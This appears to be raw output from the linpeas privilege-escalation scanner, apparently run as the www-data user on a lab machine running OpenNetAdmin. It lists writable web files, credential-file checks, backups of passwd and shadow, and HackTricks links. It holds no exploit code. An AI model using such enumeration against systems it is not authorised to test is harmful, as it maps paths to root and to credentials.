╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                                                                      
/etc/ld.so.conf                                                                                                                                                                                                                             
Content of /etc/ld.so.conf:                                                                                                                                                                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                                                                                               
  - /usr/local/lib                                                                                                                                                                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                                                                         
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                                                                            
total 28                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Jan  2  2020 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rw-r--r--  1 root root  825 Jun  5  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 23754 Jul 12  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1793 Nov 15  2019 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
/dev/mqueue
/dev/shm
/opt/ona
/opt/ona/.gitignore
/opt/ona/README.md
/opt/ona/VERSION
/opt/ona/bin
/opt/ona/bin/README
/opt/ona/docs
/opt/ona/docs/CODING_STANDARDS
/opt/ona/docs/DEVELOPERS
/opt/ona/docs/INSTALL
/opt/ona/docs/LICENSE
/opt/ona/docs/UPGRADES
/opt/ona/etc
/opt/ona/etc/README
/opt/ona/sql
/opt/ona/sql/EXAMPLE.sql.disable
/opt/ona/sql/list_all_hosts.sql
/opt/ona/www
/opt/ona/www/.htaccess.example
/opt/ona/www/config
/opt/ona/www/config/auth_ldap.config.php
/opt/ona/www/config/config.inc.php
/opt/ona/www/config_dnld.php
/opt/ona/www/dcm.php
/opt/ona/www/images
/opt/ona/www/images/silk
/opt/ona/www/images/silk/icons
/opt/ona/www/images/silk/readme.html
/opt/ona/www/images/silk/readme.txt
/opt/ona/www/include
/opt/ona/www/include/DifferenceEngine.php
/opt/ona/www/include/adodb5
/opt/ona/www/include/adodb5/.mailmap
/opt/ona/www/include/adodb5/LICENSE.md
/opt/ona/www/include/adodb5/README.md
/opt/ona/www/include/adodb5/adodb-active-record.inc.php
/opt/ona/www/include/adodb5/adodb-active-recordx.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/datadict/datadict-access.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-db2.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-firebird.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-generic.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-ibase.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/drivers
/opt/ona/www/include/adodb5/drivers/adodb-access.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado5.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado_access.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado_mssql.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/lang
/opt/ona/www/include/adodb5/lang/adodb-ar.inc.php
/opt/ona/www/include/adodb5/lang/adodb-bg.inc.php
/opt/ona/www/include/adodb5/lang/adodb-ca.inc.php
/opt/ona/www/include/adodb5/lang/adodb-cn.inc.php
/opt/ona/www/include/adodb5/lang/adodb-cz.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/pivottable.inc.php
/opt/ona/www/include/adodb5/rsfilter.inc.php
/opt/ona/www/include/adodb5/server.php
/opt/ona/www/include/adodb5/toexport.inc.php
/opt/ona/www/include/adodb5/tohtml.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/xsl/convert-0.1-0.2.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.1-0.3.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.2-0.1.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.2-0.3.xsl
/opt/ona/www/include/adodb5/xsl/remove-0.2.xsl
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb_sessions.inc.php
/opt/ona/www/include/auth
/opt/ona/www/include/auth/ldap.class.php
/opt/ona/www/include/auth/local.class.php
/opt/ona/www/include/functions_auth.inc.php
/opt/ona/www/include/functions_db.inc.php
/opt/ona/www/include/functions_general.inc.php
/opt/ona/www/include/functions_gui.inc.php
/opt/ona/www/include/functions_network_map.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/js/bignumber.js
/opt/ona/www/include/js/global.js
/opt/ona/www/include/unknown_module_msg.inc.php
/opt/ona/www/include/xajax_0.2.4
/opt/ona/www/include/xajax_0.2.4/LICENSE.txt
/opt/ona/www/include/xajax_0.2.4/README.txt
/opt/ona/www/include/xajax_0.2.4/xajax.inc.php
/opt/ona/www/include/xajax_0.2.4/xajaxCompress.php
/opt/ona/www/include/xajax_0.2.4/xajaxResponse.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax.js
/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax_uncompressed.js
/opt/ona/www/include/xajax_drag
/opt/ona/www/include/xajax_drag/drag.inc.php
/opt/ona/www/include/xajax_drag/drag.js
/opt/ona/www/include/xajax_setup.inc.php
/opt/ona/www/include/xajax_suggest
/opt/ona/www/include/xajax_suggest/suggest.css
/opt/ona/www/include/xajax_suggest/suggest.inc.php
/opt/ona/www/include/xajax_suggest/suggest.js
/opt/ona/www/include/xajax_webwin
/opt/ona/www/include/xajax_webwin/webwin.css
/opt/ona/www/include/xajax_webwin/webwin.inc.php
/opt/ona/www/include/xajax_webwin/webwin.js
/opt/ona/www/include/xajax_webwin/webwinTT.js
/opt/ona/www/index.php
/opt/ona/www/local
/opt/ona/www/local/config
/opt/ona/www/local/config/database_settings.inc.php
/opt/ona/www/local/config/motd.txt.example
/opt/ona/www/local/config/run_installer
/opt/ona/www/local/nmap_scans
/opt/ona/www/local/nmap_scans/subnets
/opt/ona/www/local/nmap_scans/subnets/nmap.xsl
/opt/ona/www/local/plugins
/opt/ona/www/local/plugins/README
/opt/ona/www/login.php
/opt/ona/www/logout.php
/opt/ona/www/modules
/opt/ona/www/modules/get_module_list.inc.php
/opt/ona/www/modules/ipcalc.inc.php
/opt/ona/www/modules/mangle.inc.php
/opt/ona/www/modules/mysql_purge_logs.inc.php
/opt/ona/www/modules/ona
/opt/ona/www/modules/ona/block.inc.php
/opt/ona/www/modules/ona/configuration.inc.php
/opt/ona/www/modules/ona/custom_attribute.inc.php
/opt/ona/www/modules/ona/dhcp_entry.inc.php
/opt/ona/www/modules/ona/dhcp_failover.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/modules/permissions.inc.php
/opt/ona/www/modules/report_run.inc.php
/opt/ona/www/modules/sql.inc.php
/opt/ona/www/plugins
/opt/ona/www/plugins/README
/opt/ona/www/plugins/ona_nmap_scans
/opt/ona/www/plugins/ona_nmap_scans/install.php
/opt/ona/www/plugins/ona_nmap_scans/nmap.xsl
/opt/ona/www/plugins/ona_nmap_scans/nmap_scan_cron
/opt/ona/www/plugins/ona_nmap_scans/ona_nmap_scans.inc.php
/opt/ona/www/plugins/ona_nmap_scans/plugin_info.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/plugins/ona_nmap_scans/sql/check_last_response.sql
/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets.sql
/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets_only_yes.sql
/opt/ona/www/winc
/opt/ona/www/winc/app_about.inc.php
/opt/ona/www/winc/app_admin_tools.inc.php
/opt/ona/www/winc/app_advanced_search.inc.php
/opt/ona/www/winc/app_config_type_edit.inc.php
/opt/ona/www/winc/app_config_type_list.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/workspace_plugins
/opt/ona/www/workspace_plugins/builtin
/opt/ona/www/workspace_plugins/builtin/config_archives
/opt/ona/www/workspace_plugins/builtin/config_archives/main.inc.php
/opt/ona/www/workspace_plugins/builtin/custom_attributes
/opt/ona/www/workspace_plugins/builtin/custom_attributes/main.inc.php
/opt/ona/www/workspace_plugins/builtin/desktop_counts
/opt/ona/www/workspace_plugins/builtin/desktop_counts/main.inc.php
/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks
/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks/main.inc.php
/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck
/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_entries
/opt/ona/www/workspace_plugins/builtin/dhcp_entries/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_pools
/opt/ona/www/workspace_plugins/builtin/dhcp_pools/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_servers
/opt/ona/www/workspace_plugins/builtin/dhcp_servers/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_actions
/opt/ona/www/workspace_plugins/builtin/host_actions/config.inc.php
/opt/ona/www/workspace_plugins/builtin/host_actions/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_detail
/opt/ona/www/workspace_plugins/builtin/host_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_services
/opt/ona/www/workspace_plugins/builtin/host_services/main.inc.php
/opt/ona/www/workspace_plugins/builtin/location_detail
/opt/ona/www/workspace_plugins/builtin/location_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/messages
/opt/ona/www/workspace_plugins/builtin/messages/main.inc.php
/opt/ona/www/workspace_plugins/builtin/reports
/opt/ona/www/workspace_plugins/builtin/reports/main.inc.php
/opt/ona/www/workspace_plugins/builtin/subnet_detail
/opt/ona/www/workspace_plugins/builtin/subnet_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/subnet_map
/opt/ona/www/workspace_plugins/builtin/subnet_map/main.inc.php

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)                                                                                                                                                                       
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
grep: write error: Broken pipe
  Group www-data:
/opt/ona/docs                                                                                                                                                                                                                               
/opt/ona/docs/LICENSE
/opt/ona/docs/UPGRADES
/opt/ona/docs/INSTALL
/opt/ona/docs/DEVELOPERS
/opt/ona/docs/CODING_STANDARDS
/opt/ona/etc
/opt/ona/etc/README
/opt/ona/bin
/opt/ona/bin/README
/opt/ona/README.md
/opt/ona/sql
/opt/ona/sql/EXAMPLE.sql.disable
/opt/ona/sql/list_all_hosts.sql
/opt/ona/www
/opt/ona/www/plugins
/opt/ona/www/plugins/README
/opt/ona/www/plugins/ona_nmap_scans
/opt/ona/www/plugins/ona_nmap_scans/report.inc.php
/opt/ona/www/plugins/ona_nmap_scans/plugin_info.php
/opt/ona/www/plugins/ona_nmap_scans/nmap.xsl
/opt/ona/www/plugins/ona_nmap_scans/report_item.inc.php
/opt/ona/www/plugins/ona_nmap_scans/nmap_scan_cron
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets_only_yes.sql
/opt/ona/www/plugins/ona_nmap_scans/sql/check_last_response.sql
/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets.sql
/opt/ona/www/plugins/ona_nmap_scans/install.php
/opt/ona/www/images
/opt/ona/www/images/silk
/opt/ona/www/images/silk/readme.txt
/opt/ona/www/images/silk/icons
/opt/ona/www/images/silk/readme.html
/opt/ona/www/include
/opt/ona/www/include/xajax_0.2.4
/opt/ona/www/include/xajax_0.2.4/README.txt
/opt/ona/www/include/xajax_0.2.4/xajax.inc.php
/opt/ona/www/include/xajax_0.2.4/xajax_js
/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax_uncompressed.js
/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax.js
/opt/ona/www/include/xajax_0.2.4/xajaxResponse.inc.php
/opt/ona/www/include/xajax_0.2.4/LICENSE.txt
/opt/ona/www/include/xajax_0.2.4/xajaxCompress.php
/opt/ona/www/include/xajax_drag
/opt/ona/www/include/xajax_drag/drag.inc.php
/opt/ona/www/include/xajax_drag/drag.js
/opt/ona/www/include/js
/opt/ona/www/include/js/global.js
/opt/ona/www/include/js/bignumber.js
/opt/ona/www/include/functions_network_map.inc.php
/opt/ona/www/include/DifferenceEngine.php
/opt/ona/www/include/html_style_sheet.inc.php
/opt/ona/www/include/xajax_suggest
/opt/ona/www/include/xajax_suggest/suggest.js
/opt/ona/www/include/xajax_suggest/suggest.css
/opt/ona/www/include/xajax_suggest/suggest.inc.php
/opt/ona/www/include/html_desktop.inc.php
/opt/ona/www/include/adodb5
/opt/ona/www/include/adodb5/LICENSE.md
/opt/ona/www/include/adodb5/adodb-memcache.lib.inc.php
/opt/ona/www/include/adodb5/adodb-xmlschema03.inc.php
/opt/ona/www/include/adodb5/server.php
/opt/ona/www/include/adodb5/datadict
/opt/ona/www/include/adodb5/datadict/datadict-mssqlnative.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-generic.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-mysql.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-db2.inc.php
/opt/ona/www/include/adodb5/datadict/datadict-sybase.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/adodb-errorhandler.inc.php
/opt/ona/www/include/adodb5/adodb-time.inc.php
/opt/ona/www/include/adodb5/composer.json
/opt/ona/www/include/adodb5/adodb-csvlib.inc.php
/opt/ona/www/include/adodb5/adodb-active-record.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/drivers/adodb-csv.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-mssql.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-mssql_n.inc.php
/opt/ona/www/include/adodb5/drivers/adodb-ado_access.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/xmlschema03.dtd
/opt/ona/www/include/adodb5/.mailmap
/opt/ona/www/include/adodb5/xsl
/opt/ona/www/include/adodb5/xsl/convert-0.1-0.2.xsl
/opt/ona/www/include/adodb5/xsl/remove-0.2.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.2-0.1.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.2-0.3.xsl
/opt/ona/www/include/adodb5/xsl/convert-0.1-0.3.xsl
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/rsfilter.inc.php
/opt/ona/www/include/adodb5/adodb-active-recordx.inc.php
/opt/ona/www/include/adodb5/adodb-lib.inc.php
/opt/ona/www/include/adodb5/adodb-exceptions.inc.php
/opt/ona/www/include/adodb5/xmlschema.dtd
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/lang/adodb-pt-br.inc.php
/opt/ona/www/include/adodb5/lang/adodb-cz.inc.php
/opt/ona/www/include/adodb5/lang/adodb-fr.inc.php
/opt/ona/www/include/adodb5/lang/adodb-cn.inc.php
/opt/ona/www/include/adodb5/lang/adodb-ro.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/adodb5/adodb-datadict.inc.php
/opt/ona/www/include/unknown_module_msg.inc.php
/opt/ona/www/include/functions_general.inc.php
/opt/ona/www/include/xajax_setup.inc.php
/opt/ona/www/include/functions_auth.inc.php
/opt/ona/www/include/functions_db.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/include/auth/ldap.class.php
/opt/ona/www/include/auth/local.class.php
/opt/ona/www/include/xajax_webwin
/opt/ona/www/include/xajax_webwin/webwin.js
/opt/ona/www/include/xajax_webwin/webwin.inc.php
/opt/ona/www/include/xajax_webwin/webwinTT.js
/opt/ona/www/include/xajax_webwin/webwin.css
/opt/ona/www/include/functions_gui.inc.php
/opt/ona/www/include/adodb_sessions.inc.php
/opt/ona/www/config
/opt/ona/www/config/auth_ldap.config.php
/opt/ona/www/config/config.inc.php
/opt/ona/www/.htaccess.example
/opt/ona/www/dcm.php
/opt/ona/www/local
/opt/ona/www/local/plugins
/opt/ona/www/local/plugins/README
/opt/ona/www/local/config
/opt/ona/www/local/config/motd.txt.example
/opt/ona/www/local/nmap_scans
/opt/ona/www/local/nmap_scans/subnets
/opt/ona/www/local/nmap_scans/subnets/nmap.xsl
/opt/ona/www/winc
/opt/ona/www/winc/list_configs.inc.php
/opt/ona/www/winc/app_about.inc.php
/opt/ona/www/winc/app_config_type_edit.inc.php
/opt/ona/www/winc/app_admin_tools.inc.php
/opt/ona/www/winc/display_domain_server.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/workspace_plugins
/opt/ona/www/workspace_plugins/builtin
/opt/ona/www/workspace_plugins/builtin/desktop_counts
/opt/ona/www/workspace_plugins/builtin/desktop_counts/main.inc.php
/opt/ona/www/workspace_plugins/builtin/location_detail
/opt/ona/www/workspace_plugins/builtin/location_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/custom_attributes
/opt/ona/www/workspace_plugins/builtin/custom_attributes/main.inc.php
/opt/ona/www/workspace_plugins/builtin/config_archives
/opt/ona/www/workspace_plugins/builtin/config_archives/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_actions
/opt/ona/www/workspace_plugins/builtin/host_actions/config.inc.php
/opt/ona/www/workspace_plugins/builtin/host_actions/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_entries
/opt/ona/www/workspace_plugins/builtin/dhcp_entries/main.inc.php
/opt/ona/www/workspace_plugins/builtin/subnet_detail
/opt/ona/www/workspace_plugins/builtin/subnet_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/messages
/opt/ona/www/workspace_plugins/builtin/messages/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_services
/opt/ona/www/workspace_plugins/builtin/host_services/main.inc.php
/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck
/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck/main.inc.php
/opt/ona/www/workspace_plugins/builtin/subnet_map
/opt/ona/www/workspace_plugins/builtin/subnet_map/main.inc.php
/opt/ona/www/workspace_plugins/builtin/host_detail
/opt/ona/www/workspace_plugins/builtin/host_detail/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_pools
/opt/ona/www/workspace_plugins/builtin/dhcp_pools/main.inc.php
/opt/ona/www/workspace_plugins/builtin/reports
/opt/ona/www/workspace_plugins/builtin/reports/main.inc.php
/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks
/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks/main.inc.php
/opt/ona/www/workspace_plugins/builtin/dhcp_servers
/opt/ona/www/workspace_plugins/builtin/dhcp_servers/main.inc.php
/opt/ona/www/logout.php
/opt/ona/www/config_dnld.php
/opt/ona/www/login.php
/opt/ona/www/modules
/opt/ona/www/modules/sql.inc.php
/opt/ona/www/modules/ipcalc.inc.php
/opt/ona/www/modules/mysql_purge_logs.inc.php
/opt/ona/www/modules/report_run.inc.php
/opt/ona/www/modules/get_module_list.inc.php
#)You_can_write_even_more_files_inside_last_directory

/opt/ona/www/modules/ona/dhcp_pool.inc.php
/opt/ona/www/modules/ona/location.inc.php
/opt/ona/www/modules/ona/message.inc.php
/opt/ona/www/modules/ona/custom_attribute.inc.php
/opt/ona/www/modules/ona/tag.inc.php
#)You_can_write_even_more_files_inside_last_directory



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2025-05-01+07:31:16.8305052030 /tmp/WQWSGd9h
2019-11-21+13:45:02.7710843610 /etc/console-setup/cached_setup_terminal.sh
2019-11-21+13:45:02.7670843610 /etc/console-setup/cached_setup_keyboard.sh
2019-11-21+13:45:02.7670843610 /etc/console-setup/cached_setup_font.sh
2019-11-21+13:41:19.2685380740 /etc/network/if-up.d/mtuipv6
2019-11-21+13:41:19.2685380740 /etc/network/if-pre-up.d/mtuipv6

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                                                                    
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv

╔══════════╣ Unexpected in root
/vmlinuz.old                                                                                                                                                                                                                                
/initrd.img.old
/initrd.img
/vmlinuz

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/journal/44bf1480ab2c456192be5f80ba18261f/system.journal
/var/log/kern.log
/var/log/auth.log

logrotate 3.11.0

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Files inside others home (limit 20)
/var/www/html/artwork/js/jquery-3.3.1.min.js                                                                                                                                                                                                
/var/www/html/artwork/js/jquery-migrate-3.0.1.min.js
/var/www/html/artwork/js/jquery.fancybox.min.js
/var/www/html/artwork/js/bootstrap-datepicker.min.js
/var/www/html/artwork/js/jquery.stellar.min.js
/var/www/html/artwork/js/jquery-migrate-3.0.0.js
/var/www/html/artwork/js/jquery.magnific-popup.min.js
/var/www/html/artwork/js/jquery-ui.js
/var/www/html/artwork/js/bootstrap.min.js
/var/www/html/artwork/js/main.js
/var/www/html/artwork/js/jquery.animateNumber.min.js
/var/www/html/artwork/js/aos.js
/var/www/html/artwork/js/mediaelement-and-player.min.js
/var/www/html/artwork/js/jquery.easing.1.3.js
/var/www/html/artwork/js/jquery.waypoints.min.js
/var/www/html/artwork/js/typed.js
/var/www/html/artwork/js/popper.min.js
/var/www/html/artwork/js/slick.min.js
/var/www/html/artwork/js/jquery.countdown.min.js
/var/www/html/artwork/js/jquery.sticky.js
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 3 Apr 12  2016 /snap/core/7270/var/backups                                                                                                                                                                           
total 0

drwxr-xr-x 2 root root 3 Apr 12  2016 /snap/core/8039/var/backups
total 0

drwxr-xr-x 2 root root 4096 May  1 06:25 /var/backups
total 804
-rw-r--r-- 1 root root    40960 May  1 06:25 alternatives.tar.0
-rw-r--r-- 1 root root     2325 Nov 22  2019 alternatives.tar.1.gz
-rw-r--r-- 1 root root    27104 Jul 27  2021 apt.extended_states.0
-rw-r--r-- 1 root root     3113 Jul 12  2021 apt.extended_states.1.gz
-rw-r--r-- 1 root root     3126 Jan  2  2020 apt.extended_states.2.gz
-rw-r--r-- 1 root root     3312 Nov 21  2019 apt.extended_states.3.gz
-rw-r--r-- 1 root root      437 Aug  5  2019 dpkg.diversions.0
-rw-r--r-- 1 root root      202 Aug  5  2019 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      207 Nov 21  2019 dpkg.statoverride.0
-rw-r--r-- 1 root root      171 Nov 21  2019 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root   542632 Aug 17  2021 dpkg.status.0
-rw-r--r-- 1 root root   159674 Nov 21  2019 dpkg.status.1.gz
-rw------- 1 root root      749 Jan  2  2020 group.bak
-rw------- 1 root shadow    620 Jan  2  2020 gshadow.bak
-rw------- 1 root root     1660 Nov 22  2019 passwd.bak
-rw------- 1 root shadow   1177 Nov 22  2019 shadow.bak


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 7905 Nov 12  2019 /lib/modules/4.15.0-70-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Nov 12  2019 /lib/modules/4.15.0-70-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 35544 May 14  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 2746 Jun  4  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11755 Nov 21  2019 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 0 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 217491 Nov 12  2019 /usr/src/linux-headers-4.15.0-70-generic/.config.old
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old
-rw-rw-r-- 1 www-data www-data 920 Oct  6  2019 /var/www/html/artwork/fonts/flaticon/backup.txt
-rw-rw-r-- 1 www-data www-data 892 Sep 29  2019 /var/www/html/marga/fonts/flaticon/backup.txt
-rw-rw-r-- 1 www-data www-data 896 May  6  2019 /var/www/html/marga/fonts/flaticon-1/backup.txt

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file                                                                                                                                                    
Found /snap/core/8039/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 16K
drwxr-xr-x  4 root     root     4.0K Nov 22  2019 .
drwxr-xr-x 14 root     root     4.0K Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4.0K Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4.0K Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www

/var/www/html:
total 36K

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Apr 30 16:31 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 1531 Nov 21  2019 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-rw-r-- 1 www-data www-data 1970 Jan  3  2018 /opt/ona/www/.htaccess.example
-rw-r--r-- 1 landscape landscape 0 Aug  5  2019 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 1531 Nov 21  2019 /var/cache/apparmor/.features
-rw-rw-r-- 1 www-data www-data 6148 Jul 16  2019 /var/www/html/artwork/images/.DS_Store
-rw-rw-r-- 1 www-data www-data 10244 Aug 30  2018 /var/www/html/artwork/scss/bootstrap/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 13  2018 /var/www/html/artwork/scss/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 17  2018 /var/www/html/artwork/css/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Oct  9  2019 /var/www/html/artwork/fonts/.DS_Store
-rw-rw-r-- 1 www-data www-data 8196 Oct  8  2019 /var/www/html/artwork/.DS_Store
